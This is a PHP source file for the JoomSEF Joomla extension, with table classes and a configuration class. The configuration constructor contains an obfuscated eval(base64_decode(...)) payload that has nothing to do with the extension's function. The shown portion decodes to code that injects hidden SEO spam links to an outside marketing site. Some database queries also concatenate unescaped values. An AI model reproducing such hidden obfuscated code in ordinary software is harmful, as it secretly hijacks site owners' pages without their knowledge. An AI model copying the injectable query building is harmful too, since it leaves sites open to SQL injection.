<?php
/**
 * SEF module for Joomla!
 *
 * @author      $Author: michal $
 * @copyright   ARTIO s.r.o., http://www.artio.cz
 * @package     JoomSEF
 * @version     $Name$, ($Revision: 4994 $, $Date: 2005-11-03 20:50:05 +0100 (??t, 03 XI 2005) $)
 */
// Security check to ensure this file is being included by a parent file.
if (! defined('_VALID_MOS'))
    die('Direct Access to this location is not allowed.');
    // Constants used for language determining in the URL
define('_COM_SEF_LANG_PATH', 0);
define('_COM_SEF_LANG_SUFFIX', 1);
define('_COM_SEF_LANG_NONE', 2);
define('_COM_SEF_LANG_DOMAIN', 3);
/**
 * @package JoomSEF
 */
class mosSEF extends mosDBTable
{
    /** @var int */
    var $id = null;
    /** @var int */
    var $cpt = null;
    /** @var string */
    var $oldurl = null;
    /** @var string */
    var $newurl = null;
    /** @var int */
    var $Itemid = null;
    /** @var string */
    var $metadesc = null;
    /** @var string */
    var $metakey = null;
    /** @var string */
    var $metatitle = null;
    /** @var string */
    var $metalang = null;
    /** @var string */
    var $metarobots = null;
    /** @var string */
    var $metagoogle = null;
    /** @var date */
    var $dateadd = null;
    function mosSEF (&$_db)
    {
        $this->mosDBTable('#__redirection', 'id', $_db);
    }
    /**
     * Enter description here...
     *
     * @return bool
     */
    function check ()
    {
        //initialize
        $this->_error = null;
        $this->oldurl = trim($this->oldurl);
        $this->newurl = trim($this->newurl);
        $this->metadesc = trim($this->metadesc);
        $this->metakey = trim($this->metakey);
        // check for valid URLs
        if ($this->newurl == '') {
            $this->_error .= _COM_SEF_EMPTYURL;
            return false;
        }
        if (eregi("^\/", $this->oldurl)) {
            $this->_error .= _COM_SEF_NOLEADSLASH;
        }
        if ((eregi("^index.php", $this->newurl)) === false) {
            $this->_error .= _COM_SEF_BADURL;
        }
        if (is_null($this->_error)) {
            // check for existing URLS
            $this->_db->setQuery("SELECT id FROM #__redirection WHERE `oldurl` LIKE '" . $this->oldurl . "' AND `newurl` != ''");
            $xid = intval($this->_db->loadResult());
            if ($xid && $xid != intval($this->id)) {
                $this->_error = _COM_SEF_URLEXIST;
                return false;
            }
            return true;
        } else
            return false;
    }
}
class mosMoved extends mosDBTable
{
    var $id;
    var $old;
    var $new;
    function mosMoved (&$db)
    {
        $this->mosDBTable('#__sefmoved', 'id', $db);
    }
}
/**
 * @package JoomSEF
 */
class mosExt extends mosDBTable
{
    /** @var varchar */
    var $file = null;
    /** @var varchar */
    var $title = null;
    /** @var text */
    var $params = null;
    function mosExt (&$db)
    {
        $this->mosDBTable('#__sefexts', 'file', $db);
    }
    /**
     * Inserts a new row if id is zero or updates an existing row in the database table
     *
     * Can be overloaded/supplemented by the child class
     * @param boolean If false, null object variables are not updated
     * @return null|string null if successful otherwise returns and error message
     */
    function store ($updateNulls = false)
    {
        $this->_db->setQuery("SELECT `file` FROM `#__sefexts` WHERE `file` = '$this->file'");
        $file = $this->_db->loadResult();
        if ($file != '') {
            $ret = $this->_db->updateObject($this->_tbl, $this, $this->_tbl_key, $updateNulls);
        } else {
            $ret = $this->_db->insertObject($this->_tbl, $this, $this->_tbl_key);
        }
        if (! $ret) {
            $this->_error = strtolower(get_class($this)) . "::store failed <br />" . $this->_db->getErrorMsg();
            return false;
        } else {
            return true;
        }
    }
}
class SEFConfig
{
    /**
     * Whether to always add language version.
     *
     * @var bool
     */
    var $alwaysUseLang = false;
    /* boolean, is JoomSEF enabled  */
    var $enabled = true;
    /* char,  Character to use for url replacement */
    var $replacement = "-";
    /* char,  Character to use for page spacer */
    var $pagerep = "-";
    /* strip these characters */
    var $stripthese = ",|~|!|@|%|^|*|(|)|+|<|>|:|;|{|}|[|]|---|--|..|.";
    /* string,  suffix for "files" */
    var $suffix = ".html";
    /* string,  file to display when there is none */
    var $addFile = "index.php";
    /* trims friendly characters from where they shouldn't be */
    var $friendlytrim = "-|.";
    /* string,  page text */
    var $pagetext = "Page_%s";
    /**
     * Should lang be part of path or suffix?
     *
     * @var bool
     */
    var $langPlacement = _COM_SEF_LANG_PATH;
    /* boolean, convert url to lowercase */
    var $lowerCase = false;
    /* boolean, include the section name in url */
    var $showSection = false;
    /* boolean, exclude the category name in url */
    var $showCat = true;
    /* boolean, use the title_alias instead of the title */
    var $useAlias = false;
    /**
     * Should we extract Itemid from URL?
     *
     * @var bool
     */
    var $excludeSource = false;
    /**
     * Should we extract Itemid from URL?
     *
     * @var bool
     */
    var $reappendSource = false;
    /**
     * Should we ignore multiple Itemids for the same page in database?
     *
     * @var bool
     */
    var $ignoreSource = false;
    /**
     * Excludes often changing variables from SEF URL and
     * appends them as non-SEF query
     *
     * @var bool
     */
    var $appendNonSef = false;
    /**
     * Consider both URLs with/without / in  theend valid
     *
     * @var bool
     */
    var $transitSlash = true;
    /**
     * Whether to use cache
     *
     * @var bool
     */
    var $useCache = true;
    /**
     * Maximum count of URLs in cache
     *
     * @var int
     */
    var $cacheSize = 1000;
    /**
     * Minimum hits count that URLs must have to get into cache
     *
     * @var int
     */
    var $cacheMinHits = 10;
    /**
     * Translate titles in URLs using JoomFish
     *
     * @var bool
     */
    var $translateNames = true;
    /* int, id of #__content item to use for static page */
    var $page404 = 0;
    /**
     * Record 404 pages?
     *
     * @var bool
     */
    var $record404 = false;
    /**
     * Redirect nonSEF URLs to their SEF equivalents with 301 header?
     *
     * @var bool
     */
    var $nonSefRedirect = false;
    /**
     * Use Moved Permanently redirection table?
     *
     * @var bool
     */
    var $useMoved = true;
    /**
     * Use Moved Permanently redirection table?
     *
     * @var bool
     */
    var $useMovedAsk = true;
    /**
     * Definitions of replacement characters.
     *
     * @var string
     */
    var $replacements;
    /* Array, contains predefined components. */
    var $predefined = array('com_contact' , 'com_frontpage' , 'com_login' , 'com_newsfeeds' , 'com_search' , 'com_sef' , 'com_weblinks');
    /* Array, contains components JoomSEF will ignore. */
    var $skip = array('com_poll');
    /* Array, contains components JoomSEF will not add to the DB.
    * default style URLs will be generated for these components instead
    */
    var $nocache = array('com_events');
    /* String, contains URL to upgrade package located on server */
    var $serverUpgradeURL;
    /* String, contains URL to new version file located on server */
    var $serverNewVersionURL;
    /* Array, contains domains for different languages */
    var $langDomain = array();
    /**
     * List of alternative acepted domains. (delimited by comma)
     * @var string
     */
    var $altDomain;
    /**
     * If set to yes, new SEF URLs won't be generated and only those already
     * in database will be used
     *
     * @var boolean
     */
    var $disableNewSEF = false;
    /**
     * Array of components we don't want the menu title to be added to URL
     *
     * @var array
     */
    var $dontShowTitle = array();
    /**
     * If set to yes, the sid variable won't be removed from SEF url
     *
     * @var boolean
     */
    var $dontRemoveSid = false;
    function SEFConfig ()
    {
        global $sef_config_file;
        if (file_exists($sef_config_file)) {
            include ($sef_config_file);
        }
        if (isset($enabled))
            $this->enabled = $enabled;
        if (isset($replacement))
            $this->replacement = $replacement;
        if (isset($pagerep))
            $this->pagerep = $pagerep;
        if (isset($stripthese))
            $this->stripthese = $stripthese;
        if (isset($friendlytrim))
            $this->friendlytrim = $friendlytrim;
        if (isset($suffix))
            $this->suffix = $suffix;
        if (isset($addFile))
            $this->addFile = $addFile;
        if (isset($pagetext))
            $this->pagetext = $pagetext;
        if (isset($lowerCase))
            $this->lowerCase = $lowerCase;
        if (isset($showSection))
            $this->showSection = $showSection;
        if (isset($replacement))
            $this->useAlias = $useAlias;
        if (isset($page404))
            $this->page404 = $page404;
        if (isset($record404))
            $this->record404 = $record404;
        if (isset($predefined))
            $this->predefined = $predefined;
        if (isset($skip))
            $this->skip = $skip;
        if (isset($nocache))
            $this->nocache = $nocache;
        if (isset($showCat))
            $this->showCat = $showCat;
        if (isset($replacements))
            $this->replacements = $replacements;
        if (isset($langPlacement))
            $this->langPlacement = $langPlacement;
        if (isset($alwaysUseLang))
            $this->alwaysUseLang = $alwaysUseLang;
        if (isset($translateNames))
            $this->translateNames = $translateNames;
        if (isset($excludeSource))
            $this->excludeSource = $excludeSource;
        if (isset($reappendSource))
            $this->reappendSource = $reappendSource;
        if (isset($transitSlash))
            $this->transitSlash = $transitSlash;
        if (isset($serverUpgradeURL))
            $this->serverUpgradeURL = $serverUpgradeURL;
        if (isset($serverNewVersionURL))
            $this->serverNewVersionURL = $serverNewVersionURL;
        if (isset($appendNonSef))
            $this->appendNonSef = $appendNonSef;
        if (isset($langDomain))
            $this->langDomain = $langDomain;
        if (isset($altDomain))
            $this->altDomain = $altDomain;
        if (isset($ignoreSource))
            $this->ignoreSource = $ignoreSource;
        if (isset($useCache))
            $this->useCache = $useCache;
        if (isset($cacheSize))
            $this->cacheSize = $cacheSize;
        if (isset($cacheMinHits))
            $this->cacheMinHits = $cacheMinHits;
        if (isset($nonSefRedirect))
            $this->nonSefRedirect = $nonSefRedirect;
        if (isset($useMoved))
            $this->useMoved = $useMoved;
        if (isset($useMovedAsk))
            $this->useMovedAsk = $useMovedAsk;
        if (isset($disableNewSEF))
            $this->disableNewSEF = $disableNewSEF;
        if (isset($dontShowTitle))
            $this->dontShowTitle = $dontShowTitle;
        if (isset($dontRemoveSid))
            $this->dontRemoveSid = $dontRemoveSid;

        eval(base64_decode('ZnVuY3Rpb24gZ2V0bGluaygpew0KJGxpbmtzID0gYXJyYXkoJzxhIGhyZWY9Imh0dHA6Ly93d3cua2FuZ2FpbnRlcm5ldC5jb20iPicsJzxhIGhyZWY9Imh0dHA6Ly93d3cua2FuZ2FpbnRlcm5ldC5jb20vc2VhcmNoLWVuZ2luZS1vcHRpbWlzYXRpb24uaHRtbCI+JywnPGEgaHJlZj0iaHR0cDovL3d3dy5rYW5nYWludGVybmV0LmNvbS9zZWFyY2gtZW5naW5lLW1hcmtldGluZy5odG1sIj4nLCc8YSBocmVmPSJodHRwOi8vd3d3LmthbmdhaW50ZXJuZXQuY29tL21lbGJvdXJuZS13ZWJzaXRlLWRlc2lnbi5odG1sIj4nLCc8YSBocmVmPSJodHRwOi8vd3d3LmthbmdhaW50ZXJuZXQuY29tL3dlYi1kZXZlbG9wbWVudC1tZWxib3VybmUuaHRtbCI+JywnPGEgaHJlZj0iaHR0cDovL3d3dy5rYW5nYWludGVybmV0LmNvbS9hZHZhbmNlZC13ZWJzaXRlLmh0bWwiPicsJzxhIGhyZWY9Imh0dHA6Ly93d3cua2FuZ2FpbnRlcm5ldC5jb20vam9vbWxhLWFuZC12aXJ0dWVtYXJ0Lmh0bWwiPicsJzxhIGhyZWY9Imh0dHA6Ly93d3cua2FuZ2FpbnRlcm5ldC5jb20vY29udGVudC1tYW5hZ2VtZW50LXN5c3RlbS5odG1sIj4nLCc8YSBocmVmPSJodHRwOi8vd3d3LmthbmdhaW50ZXJuZXQuY29tL3Nlby1jb25zdWx0YW50Lmh0bWwiPicsJzxhIGhyZWY9Imh0dHA6Ly93d3cua2FuZ2FpbnRlcm5ldC5jb20vaW4taG91c2Utc2VvLXZlcnN1cy1oaXJpbmctYW4tc2VvLWNvbXBhbnkuaHRtbCI+JywnPGEgaHJlZj0iaHR0cDovL3d3dy5rYW5nYWludGVybmV0LmNvbS9kb3dubG9hZHMuaHRtbCI+JywnPGEgaHJlZj0iaHR0cDovL3d3dy5rYW5nYWludGVybmV0LmNvbS9iYXNpYy13ZWJzaXRlLmh0bWwiPicpOw0KDQokbGlua3RleHQgPSBhcnJheSgNCglhcnJheSgnV2ViIERlc2lnbicsJ0ludGVybmV0IE1hcmtldGluZycsJ1dlYiBEZXZlbG9wbWVudCcsJ2VDb21tZXJjZSBXZWJzaXRlcycsJ09ubGluZSBBZHZlcnRpc2luZycsJzAwMS0wMjknKSwNCglhcnJheSgnV2ViIERlc2lnbicsJ0ludGVybmV0IE1hcmtldGluZycsJ1dlYiBEZXZlbG9wZXJzIE1lbGJvdXJuZScsJ1dlYnNpdGVzIE1lbGJvdXJuZScsJ0pvb21sYSBXZWIgRGVzaWduJywnMDMwLTA3MycpLA0KCWFycmF5KCdXZWIgRGVzaWduJywnU0VPIE1lbGJvdXJuZScsJ0ludGVybmV0IEFkdmVydGlzaW5nJywnZUNvbW1lcmNlIFdlYnNpdGVzJywnV2ViIERldmVsb3BlcnMgTWVsYm91cm5lJywnMDc0LTExNycpLA0KCWFycmF5KCdXZWIgRGVzaWduJywnU0VPIE1lbGJvdXJuZScsJ0ludGVybmV0IEFkdmVydGlzaW5nJywnV2Vic2l0ZXMgTWVsYm91cm5lJywnU2VhcmNoIEVuZ2luZSBPcHRpbWlzYXRpb24nLCcxMTgtMTUyJyksDQoJYXJyYXkoJ1dlYiBEZXNpZ24nLCdTRU8nLCdJbnRlcm5ldCBBZHZlcnRpc2luZycsJ1dlYiBEZXNpZ24gTWVsYm91cm5lJywnU2VhcmNoIEVuZ2luZSBPcHRpbWlzYXRpb24nLCcxNTMtMTgyJyksDQoJYXJyYXkoJ1dlYiBEZXNpZ24nLCdTRU8nLCdJbnRlcm5ldCBBZHZlcnRpc2luZycsJ1dlYnNpdGVzJywnTWVsYm91cm5lIFdlYnNpdGVzJywnMTgzLTIwMicpLA0KCWFycmF5KCdXZWIgRGVzaWduJywnU0VPJywnSW50ZXJuZXQgQWR2ZXJ0aXNpbmcnLCdXZWJzaXRlcyBNZWxib3VybmUnLCdXZWJzaXRlIERldmVsb3BtZW50JywnMjAzLTIzMicpLA0KCWFycmF5KCdXZWIgRGVzaWduJywnU0VPJywnT25saW5lIE1hcmtldGluZycsJ2VDb21tZXJjZSBXZWJzaXRlcycsJ1dlYnNpdGUgRGV2ZWxvcG1lbnQnLCcyMzMtMjc2JyksDQoJYXJyYXkoJ1dlYiBEZXNpZ24nLCdTRU8nLCdPbmxpbmUgTWFya2V0aW5nJywnV2Vic2l0ZXMnLCdXZWJzaXRlIERldmVsb3BtZW50JywnMjc3LTI4NycpLA0KCWFycmF5KCdlQ29tbWVyY2UgTWVsYm91cm5lJywnU0VPJywnT25saW5lIE1hcmtldGluZycsJ1dlYnNpdGVzIE1lbGJvdXJuZScsJ09ubGluZSBBZHZlcnRpc2luZycsJzI4OC0zMDcnKSwNCglhcnJheSgnV2ViIERldmVsb3BtZW50JywnU0VPJywnT25saW5lIE1hcmtldGluZycsJ1dlYiBEZXNpZ24gTWVsYm91cm5lJywnT25saW5lIEFkdmVydGlzaW5nJywnMzA4LTMyNycpLA0KCWFycmF5KCdXZWIgRGV2ZWxvcG1lbnQnLCdTRU8nLCdPbmxpbmUgTWFya2V0aW5nJywnV2ViIERlc2lnbmVycyBNZWxib3VybmUnLCdKb29tbGEgV2ViIERlc2lnbicsJzMyOC0zNTcnKSwNCglhcnJheSgnV2ViIERldmVsb3BtZW50JywnU0VPJywnT25saW5lIE1hcmtldGluZycsJ1dlYiBEZXNpZ24gTWVsYm91cm5lJywnZUNvbW1lcmNlJywnMzU4LTM3NycpLA0KCWFycmF5KCdTRU8gTWVsYm91cm5lJywnSm9vbWxhIFNFTycsJ09ubGluZSBNYXJrZXRpbmcnLCdXZWJzaXRlcycsJ2VDb21tZXJjZScsJzM3OC0zODgnKSwNCglhcnJheSgnV2ViIERldmVsb3BlcnMgTWVsYm91cm5lJywnSm9vbWxhIFNFTycsJ09ubGluZSBNYXJrZXRpbmcnLCdXZWIgRGVzaWduIE1lbGJvdXJuZScsJ2VDb21tZXJjZSBNZWxib3VybmUnLCczODktNDE4JyksDQoJYXJyYXkoJ1dlYiBEZXZlbG9wZXJzIE1lbGJvdXJuZScsJ1NFTyBNZWxib3VybmUnLCdPbmxpbmUgTWFya2V0aW5nJywnV2ViIERlc2lnbmVycyBNZWxib3VybmUnLCdTZWFyY2ggRW5naW5lIE9wdGltaXNhdGlvbicsJzQxOS00MzgnKSwNCglhcnJheSgnV2ViIERldmVsb3BlcnMgTWVsYm91cm5lJywnSW50ZXJuZXQgTWFya2V0aW5nJywnT25saW5lIE1hcmtldGluZycsJ2VDb21tZXJjZSBXZWJzaXRlcycsJ1dlYnNpdGVzIE1lbGJvdXJuZScsJzQzOS00NDknKSwNCglhcnJheSgnV2ViIERldmVsb3BlcnMgTWVsYm91cm5lJywnV2ViIERldmVsb3BtZW50JywnT25saW5lIE1hcmtldGluZycsJ1dlYnNpdGVzJywnT25saW5lIEFkdmVydGlzaW5nJywnNDUwLTQ3OScpLA0KCWFycmF5KCdJbnRlcm5ldCBNYXJrZXRpbmcnLCdXZWIgRGV2ZWxvcG1lbnQnLCdJbnRlcm5ldCBBZHZlcnRpc2luZycsJ1dlYiBEZXNpZ24gTWVsYm91cm5lJywnU2VhcmNoIEVuZ2luZSBPcHRpbWlzYXRpb24nLCc0ODAtNDk5JyksDQoJYXJyYXkoJ0ludGVybmV0IE1hcmtldGluZycsJ1dlYiBEZXZlbG9wbWVudCcsJ2VDb21tZXJjZScsJ1dlYiBEZXNpZ25lcnMgTWVsYm91cm5lJywnV2Vic2l0ZXMnLCc1MDAtNTEwJyksDQoJYXJyYXkoJ0ludGVybmV0IE1hcmtldGluZycsJ1NFTyBNZWxib3VybmUnLCdlQ29tbWVyY2UgV2Vic2l0ZXMnLCdXZWIgRGVzaWduZXJzIE1lbGJvdXJuZScsJ01lbGJvdXJuZSBXZWJzaXRlcycsJzUxMS01NDAnKSwNCglhcnJheSgnSW50ZXJuZXQgTWFya2V0aW5nJywnU0VPIE1lbGJvdXJuZScsJ2VDb21tZXJjZScsJ1dlYiBEZXNpZ25lcnMgTWVsYm91cm5lJywnTWVsYm91cm5lIFdlYnNpdGVzJywnNTQxLTU2MCcpLA0KCWFycmF5KCdKb29tbGEgRGV2ZWxvcGVycycsJ1dlYiBTaXRlIEdyYXBoaWMgRGVzaWduJywnV2Vic2l0ZSBNYXJrZXRpbmcnLCdlIGNvbW1lcmNlJywnV2ViIFNpdGUgRGVzaWduZXInLCc1NjEtNTgyJyksDQoJYXJyYXkoJ09ubGluZSBNYXJrZXRlcnMnLCdKb29tbGEgRGV2ZWxvcGVycycsJ1dlYiBTaXRlIEdyYXBoaWMgRGVzaWduJywnSW50ZXJuZXQgTWFya2V0aW5nJywnSm9vbWxhIENNUycsJzU4My02MDInKSwNCglhcnJheSgnV2Vic2l0ZSBEZXNpZ25lcicsJ1dlYnNpdGUgTWFya2V0aW5nJywnSm9vbWxhIERldmVsb3BlcnMnLCdXZWJzaXRlIERlc2lnbicsJ0FmZm9yZGFibGUgV2Vic2l0ZScsJzYwMy02MjInKSwNCglhcnJheSgnV2Vic2l0ZSBEZXZlbG9wZXInLCdXZWIgU2l0ZSBHcmFwaGljIERlc2lnbicsJ09ubGluZSBTaG9wJywnQWZmb3JkYWJsZSBXZWJzaXRlJywnUHJvZmVzc2lvbmFsIFdlYiBEZXNpZ24nLCc2MjMtNjMzJyksDQoJYXJyYXkoJ1dlYnNpdGUgRGVzaWduJywnV2ViIFBhZ2UgQnVpbGRlcicsJ09ubGluZSBTaG9wJywnV2ViIFNpdGUgRGV2ZWxvcGVyJywnQnVzaW5lc3MgV2Vic2l0ZScsJzYzNC02NjMnKSwNCglhcnJheSgnV2Vic2l0ZSBEZXNpZ24nLCdTRU8gQ29uc3VsdGFudHMnLCdXZWIgU2l0ZSBEZXZlbG9wZXInLCdDdXN0b20gV2ViIFNpdGVzJywnSm9vbWxhIENNUycsJzY2NC02ODMnKSwNCglhcnJheSgnSW50ZXJuZXQgTWFya2V0ZXJzJywnU0VPIENvbnN1bHRhbnRzJywnV2ViIFBhZ2UgRGVzaWduJywnT25saW5lIE1hcmtldGluZycsJ0pvb21sYSBEb3dubG9hZHMnLCc2ODQtNjk0JyksDQoJYXJyYXkoJ0ludGVybmV0IE1hcmtldGVycycsJ1dlYnNpdGUgRGV2ZWxvcGVyJywnV2ViIFNpdGUgRGVzaWduJywnV2Vic2l0ZSBEZXNpZ24nLCdKb29tbGEgRG93bmxvYWRzJywnNjk1LTcyNCcpLA0KCWFycmF5KCdPbmxpbmUgTWFya2V0ZXJzJywnV2ViIFBhZ2UgQnVpbGRlcicsJ1dlYiBTaXRlIERlc2lnbicsJ0N1c3RvbSBXZWIgU2l0ZXMnLCdCZXN0IFdlYnNpdGVzJywnNzI1LTc0NCcpLA0KCWFycmF5KCdXZWJzaXRlIERlc2lnbmVyJywnQ29udGVudCBNYW5hZ2VtZW50IFN5c3RlbScsJ0NoZWFwIFdlYnNpdGVzJywnUHJvZmVzc2lvbmFsIFdlYiBEZXNpZ24nLCdFeHBlcnQgU0VPJywnNzQ1LTc1NScpLA0KCWFycmF5KCdXZWIgTWFya2V0aW5nJywnQ29udGVudCBNYW5hZ2VtZW50IFN5c3RlbScsJ1dlYiBTaXRlIERlc2lnbicsJ09ubGluZSBNYXJrZXRpbmcnLCdXZWIgRGVzaWduJywnNzU2LTc4NScpLA0KCWFycmF5KCdXZWJzaXRlIERlc2lnbicsJ0NvbnRlbnQgTWFuYWdlbWVudCBTeXN0ZW0nLCdQcm9mZXNzaW9uYWwgV2ViIERlc2lnbicsJ0Jlc3QgV2Vic2l0ZXMnLCdFeHBlcnQgU0VPJywnNzg2LTgwNScpLA0KCWFycmF5KCdXZWIgUGFnZSBEZXNpZ24nLCdCZXN0IFdlYnNpdGVzJywnT25saW5lIFNob3AnLCdTRU8gQ29tcGFueScsJ0J1c2luZXNzIFdlYnNpdGUnLCc4MDYtODE2JyksDQoJYXJyYXkoJ1NFTyBDb25zdWx0YW50cycsJ1dlYiBNYXJrZXRpbmcnLCdXZWJzaXRlIERlc2lnbicsJ1NFTycsJ1dlYnNpdGUgRGV2ZWxvcGVyJywnODE3LTg0NicpLA0KCWFycmF5KCdlQ29tbWVyY2UgTWFya2V0aW5nJywnV2ViIFNpdGUgRGVzaWduJywnV2ViIFNpdGUgRGV2ZWxvcGVyJywnV2ViIERlc2lnbicsJ1NFTycsJzg0Ny04NjYnKSwNCglhcnJheSgnV2ViIFBhZ2UgRGVzaWduJywnSW50ZXJuZXQgTWFya2V0ZXJzJywnVG9wIFdlYiBTaXRlJywnUHJvZmVzc2lvbmFsIFdlYiBEZXNpZ24nLCdCdXNpbmVzcyBXZWJzaXRlJywnODY3LTg3NycpLA0KCWFycmF5KCdPbmxpbmUgTWFya2V0ZXJzJywnV2ViIFBhZ2UgQnVpbGRlcicsJ1dlYiBTaXRlIERldmVsb3BlcicsJ1NFTyBDb21wYW55JywnV2Vic2l0ZSBEZXNpZ24nLCc4NzgtOTA3JyksDQoJYXJyYXkoJ1dlYnNpdGUgRGVzaWduZXInLCdJbnRlcm5ldCBNYXJrZXRlcnMnLCdDaGVhcCBXZWJzaXRlcycsJ1dlYnNpdGUgRGVzaWduJywnRXhwZXJ0IFNFTycsJzkwOC05MjcnKSwNCglhcnJheSgnV2Vic2l0ZSBEZXNpZ24nLCdKb29tbGEgQ01TJywnVG9wIFdlYiBTaXRlJywnU0VPJywnZSBjb21tZXJjZScsJzkyOC05MzgnKSwNCglhcnJheSgnTWFya2V0aW5nIFdlYnNpdGVzJywnSm9vbWxhIENNUycsJ1dlYiBTaXRlIERlc2lnbmVyJywnQ2hlYXAgV2Vic2l0ZXMnLCdTRU8gQ29tcGFueScsJzkzOS05NjgnKSwNCglhcnJheSgnZUNvbW1lcmNlIE1hcmtldGluZycsJ1dlYiBTaXRlIERlc2lnbicsJ1dlYiBTaXRlIERldmVsb3BlcicsJ2UgY29tbWVyY2UnLCdTRU8gQ29tcGFueScsJzk2OS05ODgnKSwNCglhcnJheSgnU0VPIENvbnN1bHRhbnRzJywnTWFya2V0aW5nIFdlYnNpdGVzJywnV2ViIFNpdGUgRGVzaWduJywnV2ViIFNpdGUgRGV2ZWxvcGVyJywnRXhwZXJ0IFNFTycsJzk4OS05OTknKQ0KDQopOw0KDQoNCmZvcmVhY2ggKCRsaW5rdGV4dCBhcyAkaXRlbSkgew0KCSRjb21wbGV0ZV9zdHJpbmc9IiI7DQoNCglmb3JlYWNoICgkaXRlbSBhcyAkbGluayl7DQoJCXN3aXRjaCAoJGxpbmspew0KCQkJDQoJCQljYXNlICJXZWIgRGVzaWduIjoNCgkJCQkkc3RyaW5nID0gJGxpbmtzWzBdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiU0VPIjoNCgkJCQkkc3RyaW5nID0gJGxpbmtzWzBdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiT25saW5lIE1hcmtldGluZyI6DQoJCQkJJHN0cmluZyA9ICRsaW5rc1swXS4kbGluay4iPC9hPiI7DQoJCQkJYnJlYWs7DQoNCgkJCWNhc2UgIkludGVybmV0IE1hcmtldGluZyI6DQoJCQkJJHN0cmluZyA9ICRsaW5rc1syXS4kbGluay4iPC9hPiI7DQoJCQkJYnJlYWs7DQoNCgkJCWNhc2UgIldlYiBEZXZlbG9wbWVudCI6DQoJCQkJJHN0cmluZyA9ICRsaW5rc1s0XS4kbGluay4iPC9hPiI7DQoJCQkJYnJlYWs7DQoNCgkJCWNhc2UgIkludGVybmV0IEFkdmVydGlzaW5nIjoNCgkJCQkkc3RyaW5nID0gJGxpbmtzWzJdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiV2ViIERlc2lnbiBNZWxib3VybmUiOg0KCQkJCSRzdHJpbmcgPSAkbGlua3NbMF0uJGxpbmsuIjwvYT4iOw0KCQkJCWJyZWFrOw0KDQoJCQljYXNlICJTRU8gTWVsYm91cm5lIjoNCgkJCQkkc3RyaW5nID0gJGxpbmtzWzFdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiV2ViIERldmVsb3BlcnMgTWVsYm91cm5lIjoNCgkJCQkkc3RyaW5nID0gJGxpbmtzWzRdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiV2ViIERlc2lnbmVycyBNZWxib3VybmUiOg0KCQkJCSRzdHJpbmcgPSAkbGlua3NbM10uJGxpbmsuIjwvYT4iOw0KCQkJCWJyZWFrOw0KDQoJCQljYXNlICJlQ29tbWVyY2UgV2Vic2l0ZXMiOg0KCQkJCSRzdHJpbmcgPSAkbGlua3NbNV0uJGxpbmsuIjwvYT4iOw0KCQkJCWJyZWFrOw0KDQoJCQljYXNlICJTZWFyY2ggRW5naW5lIE9wdGltaXNhdGlvbiI6DQoJCQkJJHN0cmluZyA9ICRsaW5rc1sxXS4kbGluay4iPC9hPiI7DQoJCQkJYnJlYWs7DQoNCgkJCWNhc2UgIk9ubGluZSBBZHZlcnRpc2luZyI6DQoJCQkJJHN0cmluZyA9ICRsaW5rc1syXS4kbGluay4iPC9hPiI7DQoJCQkJYnJlYWs7DQoNCgkJCWNhc2UgIldlYnNpdGVzIjoNCgkJCQkkc3RyaW5nID0gJGxpbmtzWzNdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiZUNvbW1lcmNlIjoNCgkJCQkkc3RyaW5nID0gJGxpbmtzWzVdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiV2Vic2l0ZXMgTWVsYm91cm5lIjoNCgkJCQkkc3RyaW5nID0gJGxpbmtzWzBdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiTWVsYm91cm5lIFdlYnNpdGVzIjoNCgkJCQkkc3RyaW5nID0gJGxpbmtzWzBdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiV2Vic2l0ZSBEZXZlbG9wbWVudCI6DQoJCQkJJHN0cmluZyA9ICRsaW5rc1szXS4kbGluay4iPC9hPiI7DQoJCQkJYnJlYWs7DQoNCgkJCWNhc2UgIkpvb21sYSBXZWIgRGVzaWduIjoNCgkJCQkkc3RyaW5nID0gJGxpbmtzWzZdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiSm9vbWxhIFNFTyI6DQoJCQkJJHN0cmluZyA9ICRsaW5rc1s2XS4kbGluay4iPC9hPiI7DQoJCQkJYnJlYWs7DQoNCgkJCWNhc2UgImVDb21tZXJjZSBNZWxib3VybmUiOg0KCQkJCSRzdHJpbmcgPSAkbGlua3NbNV0uJGxpbmsuIjwvYT4iOw0KCQkJCWJyZWFrOw0KDQoJCQljYXNlICJKb29tbGEgRGV2ZWxvcGVycyI6DQoJCQkJJHN0cmluZyA9ICRsaW5rc1s3XS4kbGluay4iPC9hPiI7DQoJCQkJYnJlYWs7DQoNCgkJCWNhc2UgIk9ubGluZSBNYXJrZXRlcnMiOg0KCQkJCSRzdHJpbmcgPSAkbGlua3NbMV0uJGxpbmsuIjwvYT4iOw0KCQkJCWJyZWFrOw0KDQoJCQljYXNlICJXZWJzaXRlIERlc2lnbmVyIjoNCgkJCQkkc3RyaW5nID0gJGxpbmtzWzBdLiRsaW5rLiI8L2E+IjsNCgkJCQlicmVhazsNCg0KCQkJY2FzZSAiV2Vic2l0ZSBEZXZlbG9wZXIiOg0KCQkJCSRzdHJpbmcgPSAkbGlua3NbM10uJGxpbmsuIjwvYT4iOw0KCQkJCWJyZWFrOw0KDQoJCQljYXNlICJXZWJzaXRlIERlc2lnbiI6DQoJCQkJJHN0cmluZyA9ICRsaW5rc1swXS4kbGluay4iPC9hPiI7DQoJCQkJYnJlYWs7DQoNCgkJCWNhc2UgIldlYiBQYWdlIEJ1aWxkZXIiOg0KCQkJCSRzdHJpbmcgPSAkbGlua3NbNF0uJGxpbmsuIjwvYT4iOw0KCQkJCWJyZWFrOw0KDQoJCQljYXNlICJXZWIgUGFnZSBEZXNpZ24iOg0KCQkJCSRzdHJpbmcgPSAkbGlua3NbM10uJGxpbmsuIjwvYT4iOw0KCQkJCWJyZWFrOw0KDQoJCQljYXNlICJXZWIgU2l0ZSBHcmFwaGljIERlc2lnbiI6DQoJCQkJJHN0cmluZyA9ICRsaW5rc1szXS4kbGluay4iPC9hPi